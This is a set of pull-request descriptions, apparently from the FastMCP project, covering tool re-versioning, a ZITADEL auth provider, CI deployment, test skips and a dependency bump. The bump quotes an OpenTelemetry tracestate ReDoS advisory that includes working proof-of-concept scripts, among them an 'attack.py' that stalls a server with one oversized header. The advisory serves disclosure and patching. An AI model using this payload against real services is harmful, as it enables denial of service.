2. When the caller requested version `1.0`, `call_next` found the tool and returned it. `ToolTransform.get_tool` then applied the transform, but did not verify whether the transformed tool's version matched the requested `version`, returning the transformed `2.0` tool in response to a `1.0` request.

### Solution

1. In `ToolTransform.get_tool`, when the tool transform specifies a new version (`config.version is not None`):
   - Check if the caller's requested `version` (as `VersionSpec`) matches `config.version`. If not, return `None` immediately.
   - Set `next_version = None` when invoking `call_next` so the underlying provider returns the tool regardless of its original version.
2. After applying the transform, verify that the requested `version` matches `transformed.version` before returning:
   ```python
   if transformed.name == name and (
       version is None or version.matches(transformed.version)
   ):
       return transformed
   ```
3. Added regression tests in `tests/server/test_tool_transformation.py` verifying that calling with the new version and default (None) succeeds, while calling with the old version returns `ToolError: Unknown tool`.

Closes #6357

title: fix: support calling tools re-versioned via ToolTransformConfig (#6357)
body:
### Summary

When a tool is re-versioned via `ToolTransformConfig(version="2.0")`, it advertises the new version in `list_tools()`. However, calling `call_tool(..., version="2.0")` previously failed with `Unknown tool: ...` because `ToolTransform.get_tool` forwarded the transformed version directly to the underlying provider (`call_next`), which only possesses the tool at its original (un-reversioned) version. Furthermore, calling the stale original version (`version="1.0"`) incorrectly returned the transformed tool because `get_tool` did not verify that the transformed tool matched the requested version.

### Changes

1. **Resolution of Re-versioned Tools**:
   - In `ToolTransform.get_tool`, if a tool has a transform config specifying a version (`config.version is not None`):
     - Check early if the caller's requested `VersionSpec` matches `config.version`, returning `None` if it does not match.
     - Pass `version=None` to `call_next` so the underlying provider can retrieve the original tool regardless of the new version.
2. **Version Verification**:
   - Verify that `transformed.name == name` AND `(version is None or version.matches(transformed.version))` before returning.
3. **Tests**:
   - Added unit tests in `tests/server/test_tool_transformation.py`:
     - `test_reversioned_tool_callable_by_new_version`: Verifies that a tool re-versioned to `2.0` can be called with `version="2.0"` and `version=None`, and fails when called with old `version="1.0"`.
     - `test_reversioned_and_renamed_tool_callable_by_new_name_and_version`: Verifies tools with both name and version transforms.

Closes #6357.

Signed-off-by: Yunus Ardaguney <yunusarda-sudo@users.noreply.github.com>

title: Add ZITADEL OAuth provider
body:
## Description

ZITADEL users can't protect a FastMCP server with the generic `OIDCProxy` alone: ZITADEL issues opaque access tokens by default, its opt-in JWT access tokens carry no `scope` claim, and clients created through its Dynamic Client Registration don't get tokens bound to the MCP server. The setup that works (a static ZITADEL web application behind the OAuth proxy, with tokens validated through ZITADEL's introspection endpoint) has to be pieced together by hand today.

`ZitadelProvider` packages that setup. It discovers the endpoints from the instance's OpenID configuration and validates every upstream token through introspection, authenticated with the application's client secret. That works for opaque and JWT tokens alike, returns the granted scopes, and rejects revoked tokens on the next request. The verifier also requires the application's client ID in the token audience, so tokens issued to sibling applications in the same ZITADEL project are rejected. Project roles come through in the `urn:zitadel:iam:org:project:roles` claim. The integration guide walks through the ZITADEL Console setup, including enabling the Refresh Token grant for `offline_access`, which the creation wizard can't do.

```python
from fastmcp import FastMCP
from fastmcp.server.auth.providers.zitadel import ZitadelProvider

auth = ZitadelProvider(
    domain="https://my-instance-abc123.zitadel.cloud",
    client_id="123456789012345678",
    client_secret="your-client-secret",
    base_url="http://localhost:8000",
)

mcp = FastMCP("My Server", auth=auth)
```

The example in `examples/auth/zitadel_oauth` has been run end to end against ZITADEL Cloud.

Closes #6383

title: Add a workflow that deploys agentic triage to Prefect Cloud
body:
## Description

Deploying a triage change used to mean that someone with marvin-bot credentials ran `agentic_stack.sh register` from a clean checkout and then edited `source_sha` by hand in both triage automations, quickly, because flows refuse to run while the two disagree. Nothing in the repo could do it, so only a maintainer at a terminal could ship a triage fix.

This PR adds `agentic_stack.sh deploy` and a dispatch-only `Deploy agentic triage` workflow that runs it from main using the `PREFECT_API_KEY` repo secret. `deploy` validates the role plans, waits until no triage runs are scheduled or in flight, registers the deployments, and repins `source_sha` in both automations in the same step. It then reads the automations back to confirm the new `source_sha` took. If the commit is already live, it does nothing. If the execution plans changed since the live commit, it refuses, because that kind of deploy still needs the manual plan-publishing path. Dispatching an older commit is the rollback. The workspace URL comes from `/api/me/workspaces`, pinned to the marvin-bot workspace id and handle, so the account id doesn't have to live in the repo.

```sh
# what the workflow runs, also usable by hand
PREFECT_API_URL=... PREFECT_API_KEY=... bash .github/agentic/scripts/agentic_stack.sh deploy
```

title: Skip symlink-dependent skill tests on Windows
body:
## Description

On a stock Windows machine (non-elevated shell, Developer Mode off), creating a symlink raises `OSError: [WinError 1314] A required privilege is not held by the client`. Thirteen skill-provider tests build symlinks in their setup without guarding for this, so they error out before reaching any assertion. The other symlink tests in the repo (`test_from_directory_rejects_symlinks` and two in `test_directory_provider.py`) already carry `skipif(sys.platform == "win32", reason="symlinks need privileges")`; these three places were missed.

This adds the same marker to `test_to_directory_refuses_a_symlink`, `TestSkillProvider::test_manifest_ignores_symlink_target_outside_skill`, and, as a module-level `pytestmark`, to `tests/server/providers/test_skill_main_files.py`, where every test builds a link. Nothing changes on Linux or macOS. Test-only change; no library code touched.

Reproduced and verified on Windows 11, Python 3.12, non-elevated shell:

```bash
uv run pytest tests/skills tests/server/providers/test_skill_main_files.py tests/server/providers/test_skills_provider.py -n 0 -q
```

```text
# before (main @ 246d7ecd)
FAILED tests/skills/test_skill.py::test_to_directory_refuses_a_symlink - OSError: [WinError 1314] ...
FAILED tests/server/providers/test_skill_main_files.py::... (11 results across 10 tests)
FAILED tests/server/providers/test_skills_provider.py::TestSkillProvider::test_manifest_ignores_symlink_target_outside_skill
13 failed, 285 passed, 4 skipped
```

On Linux (Docker, `python3.12-bookworm-slim`) the same selection runs everything with the change applied: `302 passed`, nothing skipped.

`uv run prek run --all-files` passes (ruff, ruff format, ty, prettier, loq, codespell); gitleaks was skipped because the binary isn't installed locally.

title: Let a dependency's CallArgument own a tool argument
body:
a dependency that needs a value from the client can now own that argument: a `CallArgument` that names something the tool doesn't declare is lifted into the tool's schema, typed from the dependency's annotation, and its value reaches only the dependency. the marker stays explicit (chrisguidry/uncalled-for#11), so plain dependency parameters are never lifted and the tool no longer needs an unused argument to keep the value in its schema.

```python
async def current_workspace(workspace: str | None = CallArgument(optional=True)) -> str:
    return workspace or "default"


@mcp.tool
async def list_items(resolved: str = Depends(current_workspace)) -> str:
    return resolved  # schema has `workspace`; list_items never receives it
```

<details>
<summary>open question: optional references</summary>

today `CallArgument("tenant", optional=True)` resolves to `None` when the tool has no such parameter. with this change it becomes a nullable client argument, so a dependency that treats `None` as "no tenant" would now accept a client-supplied tenant. lifting only required references would be purely additive, but wouldn't cover the issue's example.

</details>

<details>
<summary>semantics</summary>

- a tool parameter with the same name still wins.
- several dependencies reading one name share one argument; it's required if any of them requires it; different annotations fail at registration.
- the logic sits in the shared `without_injected_parameters` wrapper, so prompts and resource templates get it too (a required lifted argument on a template must appear in the URI).
- background tasks pass every argument to the function, so `fastmcp_tasks` drops lifted names before the call.
- `Annotated[str | None, CallArgument()] = None` isn't supported: uncalled-for reads dependency parameters only from defaults.

</details>

Closes #6364

title: Keep colon-terminated prose lines in docstring tool descriptions
body:
since 4.1.0, a tool docstring with a prose line like `Rules:` or `if enabled:` followed by an indented block lost that line and everything after it from the tool description. griffe's google parser reads any `word:` line followed by an indented block as an admonition, and #5067 started treating every non-text section as the end of the description. now only the google-style headings griffe leaves as admonitions (`Note`, `Example`, `Warning`, …) end it; other `word:` lines stay in the description.

```python
@mcp.tool
def run(cmd: str) -> str:
    """Run a command.

    Rules:
        - never run as root
    """
# before: description == "Run a command."
# after:  the Rules block is kept
```

builds on the admonition allowlist from #5723 without its raw-text rescan, which would change behavior that predates the regression.

Fixes #5720

title: Require patched joserfc
body:
installs that upgrade fastmcp without our lock could keep a vulnerable joserfc, because the published floor (`joserfc>=1.5.0`) still allowed it. this raises the floor to the patched release (GHSA-9pg5-8c7x-5hfx) and refreshes the locks, including the lock-only opentelemetry, pyasn1 and black bumps renovate opened.

<details>
<summary>why the opentelemetry-api floor stays</summary>

raising it to `>=1.45.1` broke the pydantic-ai downstream suite: their locked opentelemetry-sdk imports `_ExtendedAttributes` from `opentelemetry.util.types`, which 1.45 removed. the lock still moves to the patched release.

</details>

supersedes #6366, #6368, #6369, #6370

### OpenTelemetry Python: Unbounded tracestate parsing in opentelemetry-api
[CVE-2026-114603](https://nvd.nist.gov/vuln/detail/CVE-2026-114603) / [GHSA-xcq7-p3pf-p88h](https://redirect.github.com/advisories/GHSA-xcq7-p3pf-p88h)

<details>
<summary>More information</summary>

#### Details
##### Summary
`TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.

##### Affected component / version
- Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`).
- Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #​1599, March 2021). Not exhaustively verified against every release in between.
- Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.

##### Details

1. The header reaches the parser without any length check:

```python

##### opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57
tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size
if tracestate_headers is None:
    tracestate = None
else:
    tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61)
```

2. The split pattern and the parser:
```python

##### opentelemetry-api/src/opentelemetry/trace/span.py:45
_TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split
_delimiter_pattern = re.compile(r"[ \t]*,[ \t]*")      # <-- (line 46) starts with an unbounded [ \t]*

##### span.py:382
@classmethod
def from_header(cls, header_list: list[str]) -> TraceState:
    pairs = {}  # type: dict[str, str]
    for header in header_list:
        members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"
        for member in members:
            if not member:
                continue
            match = _member_pattern.fullmatch(member)
            if not match:
                _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)
                    "Member doesn't match the w3c identifiers format %s",
                    member,
                )
                return cls()
            ...
```

`re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ \t]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.

3. The sibling propagator already has the missing guard:
```python

##### baggage/propagation/__init__.py:68
_MAX_HEADER_LENGTH = 8192
...
if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent
    _logger.warning(...)
    return context
```

A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s.
Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: "a=b" + N spaces + "x"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower). 

Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.

##### Proof of concept

##### A. Show the quadratic cost (no server needed)

1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected).
2. Save as `poc_tracestate.py`:
```python
import logging
import time

from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator

##### The library logs the whole malformed member at WARNING; silence it so the timings stay readable.
logging.disable(logging.CRITICAL)

TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"
propagator = TraceContextTextMapPropagator()

previous = None
for n in (10_000, 20_000, 40_000, 80_000):
    # N spaces after a valid member, no comma anywhere in the header
    carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}
    start = time.perf_counter()
    propagator.extract(carrier)
    elapsed = time.perf_counter() - start
    growth = f"x{elapsed / previous:.1f}" if previous else "-"
    print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")
    previous = elapsed
```
3. Run `python poc_tracestate.py`.
4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run:
```
  10000 characters    0.06 s  growth when size doubles: -
  20000 characters    0.26 s  growth when size doubles: x4.0
  40000 characters    1.04 s  growth when size doubles: x4.0
  80000 characters    4.13 s  growth when size doubles: x4.0
```
Replace `" "` with `"\t"` to see ≈1.6× longer.

##### B. Show that one request stalls a real server
This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).

1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi "uvicorn[standard]"`.
2. Save as `app.py`:
```python
from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware

async def app(scope, receive, send):
    await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})
    await send({"type": "http.response.body", "body": b"ok"})

app = OpenTelemetryMiddleware(app)
```
3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools`
4. Save as `attack.py`:
```python
"""Send one oversized tracestate request and, while it is being handled,
measure how long an unrelated request to the same server has to wait."""
import socket
import sys
import threading
import time

HOST, PORT = "127.0.0.1", 8000
N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000
TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"

def get(path, extra=""):
    s = socket.create_connection((HOST, PORT), timeout=120)
    s.sendall(f"GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n{extra}\r\n".encode())
    start, data = time.perf_counter(), b""
    while chunk := s.recv(65536):
        data += chunk
    return time.perf_counter() - start, data.split(b"\r\n")[0].decode()

result = {}
extra = f"traceparent: {TRACEPARENT}\r\ntracestate: a=b{' ' * N}x\r\n"
attacker = threading.Thread(target=lambda: result.update(a=get("/attack", extra)))
print("idle /ping:               %.3f s  %s" % get("/ping"))
attacker.start()
time.sleep(0.5)  # let the attack request reach the server first
print("/ping during the attack:  %.3f s  %s" % get("/ping"))
attacker.join()
print("attack request itself:    %.3f s  %s" % result["a"])
```
5. In a second terminal run `python attack.py 100000`.
6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run:
```
idle /ping:               0.000 s  HTTP/1.1 200 OK
/ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked)
attack request itself:    6.408 s  HTTP/1.1 200 OK
```
7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.

##### Severity
**Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.

**Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.

**Severity: Medium.**

##### Suggested remediation
Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input:
```diff
--- a/opentelemetry-api/src/opentelemetry/trace/span.py
+++ b/opentelemetry-api/src/opentelemetry/trace/span.py
@@ def from_header(cls, header_list: list[str]) -> TraceState:
         for header in header_list:
-            members: list[str] = re.split(_delimiter_pattern, header)
+            members: list[str] = [m.strip(" \t") for m in header.split(",")]
```
`_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.

##### Credit

Discovered and reported by SecDim Security Research
secdim.com | @​secdim | security@secdim.com

---

**FROM MAINTAINERS**

##### Summary

`TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.

Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.

##### Impact

Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.

The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.

Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.

The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.

##### Patches

Versions of `opentelemetry-api` up to and including `1.45.0` are affected.

Upgrade `opentelemetry-api` to version `1.45.1` or later.

Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.

##### Workarounds

Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.

#### Severity
- CVSS Score: 5.3 / 10 (Medium)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`

### [`v1.45.0`](https://redirect.github.com/open-telemetry/opentelemetry-python/blob/HEAD/CHANGELOG.md#Version-1450066b0-2026-09-25)

[Compare Source](https://redirect.github.com/open-telemetry/opentelemetry-python/compare/v1.44.0...v1.45.0)

##### Added

  ([#​5266](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5266))

  ([#​5351](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5351))
- `opentelemetry-sdk`: add the new stable `AlwaysRecordSampler`
  ([#​5354](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5354))

  ([#​5412](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5412))
- `opentelemetry-configuration`: wire the experimental
  `tracer_configurator/development`, `meter_configurator/development` and

  per-instrumentation-scope
  `enabled` overrides declared in the config file are applied to the provider

  `minimum_severity`/`trace_based` fields are not supported by the Python SDK

  ([#​5418](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5418))

  ([#​5449](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5449))

  references in comments no longer abort loading
  ([#​5407](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5407))
- `opentelemetry-configuration`: declarative config environment variable
  substitution now replaces an unset variable that has no default with an empty
  value instead of raising an error, per the configuration spec.
  Resource attributes whose value resolves to null (an unset `${VAR}` with no
  default) are skipped with a warning instead of being inserted as a null
  value.
  ([#​5408](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5408))
- 'scripts/build.sh`: add `opentelemetry-configuration`and`opentelemetry-proto-json\` to the package to release
  ([#​5425](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5425))
- `opentelemetry-sdk`: fix `View` instrument-name matching so a view configured
  with an instrument's real (mixed-case) name is applied; matching is now
  case-insensitive and platform-independent instead of relying on `fnmatch`'s
  OS-dependent case handling
  ([#​5430](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5430))
- `opentelemetry-sdk`: fix missing f-prefix in exponential histogram error
  messages
  ([#​5434](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5434))
- `opentelemetry-configuration`: resolve false-positive warning logs for newer
  schema minor version
  ([#​5436](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5436))
- `opentelemetry-sdk`: make methods on `FixedSizeExemplarReservoirABC` thread
  safe
  ([#​5437](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5437))
- `opentelemetry-propagator-jaeger`: fix typing issues and enable pyright
  typechecking for the package
  `opentelemetry-propagator-jaeger`: skip `uberctx-` baggage headers with an
  empty value on extraction instead of raising `TypeError`
  ([#​5440](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5440))
- `opentelemetry-sdk`: fix `TypeError` when instantiating a `_BaseConfigurator`
  subclass whose `__init__` takes arguments
  ([#​5441](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5441))
- `opentelemetry-sdk`: fix `TypeError` in `os.fork()` when a `BatchProcessor`
  or `PeriodicExportingMetricReader` is garbage collected
  ([#​5453](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5453))
- `opentelemetry-configuration`: a declarative config key present with an empty
  (null) value on an object-typed node (e.g. `always_on:`, a `- service:`
  detector, or a metric `console:` exporter) is now treated the same as an
  explicit empty config (`always_on: {}`) instead of failing type dispatch or
  silently skipping the node. Both `dict`-typed nodes and dataclasses
  constructible with no arguments are covered.
  ([#​5454](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5454))
- `opentelemetry-api`: fix copy-pasted log message in `SpanContext.__delattr__`
  ([#​5455](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5455))
- `opentelemetry-sdk`: reject views with
  `ExponentialBucketHistogramAggregation` for asynchronous instruments instead
  of silently producing no data
  ([#​5461](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5461))
- `opentelemetry-sdk`: fill every bucket of `SimpleFixedSizeExemplarReservoir`
  before random sampling
  ([#​5462](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5462))
- `opentelemetry-sdk`: Import code_attributes from stable semconv package
  ([#​5465](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5465))
- `opentelemetry-sdk`: for both the simple and batch span/log processors, count
  `otel.sdk.processor.{span,log}.processed` when the processor submits records
  to the exporter instead of after export completes, and stop stamping exporter
  failures onto this metric as `error.type`
  ([#​5472](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5472))
- `opentelemetry-sdk`: fix misleading instrument name validation error message
  (name max length is 255, not 63).
  ([#​5513](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5513))
- `opentelemetry-configuration`: add missing process executable name to default
  service name when available in resource attributes
  ([#​5534](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5534))
- `opentelemetry-sdk`: fix values for `process.executable.name` and
  `process.executable.path` to match semantic conventions.
  ([#​5535](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5535))
- `opentelemetry-api`: fix `TraceState.update` dropping all entries when adding
  a new key at the 32-key limit
  ([#​5543](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5543))
- `opentelemetry-sdk`: bound `get_aggregated_resources()` wait to the timeout
  ([#​5545](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5545))
- `opentelemetry-sdk`: don't read `process.executable.name` resource attribute
  when building default `service.name`
  ([#​5547](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5547))
- `opentelemetry-propagator-jaeger`: enforce baggage limits on both `uberctx-`
  extract and inject, borrowing the same limits (180 entries, 4096 bytes per
  entry, 8192 bytes total) the package's core `W3CBaggagePropagator` already
  uses, so neither an inbound carrier nor an in-process baggage map can produce
  unbounded work or headers.
  ([#​5556](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5556))
- `opentelemetry-sdk`: keep metric attribute values that Python considers equal
  but the data model does not, such as `True`, `1` and `1.0`, in separate
  metric streams
  ([#​5573](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5573))
- `opentelemetry-sdk`: keep `Resource` hashable and serialisable when an
  attribute value is `bytes`, instead of raising `TypeError` from every OTLP
  encoder
  ([#​5577](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5577))
- `opentelemetry-sdk`: fix instrumentation scope name matching in the tracer,
  meter and logger configurators so it is case-sensitive on every platform
  instead of relying on `fnmatch`'s OS-dependent case handling
  ([#​5584](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5584))
- `opentelemetry-sdk`: fix `TracerProvider()` raising `ValueError` when
  `OTEL_TRACES_SAMPLER_ARG` is a syntactically valid number outside the `[0.0,
  1.0]` range, instead of logging a warning and falling back like other invalid
  values
  ([#​5594](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5594))
- `opentelemetry-sdk`: retain values from synchronous instruments using
  last-value aggregation across cumulative collections
  ([#​5637](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5637))
- `opentelemetry-api`: Added guard for negative value on max_value_len
  ([#​5647](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5647))
- `opentelemetry-sdk`: fix overriding of the service.instance.id which has been
  populated from the user provided values through the resource detectors
  ([#​5660](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5660))
- `opentelemetry-exporter-otlp-proto-grpc`: Fix incorrect default port for OTLP
  gRPC exporter self-metrics
  ([#​5668](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5668))
- `opentelemetry-api`: update W3CBaggagePropagator to properly handle
  whitespace
  ([#​5680](https://redirect.github.com/open-telemetry/opentelemetry-python/pull/5680))

</details>
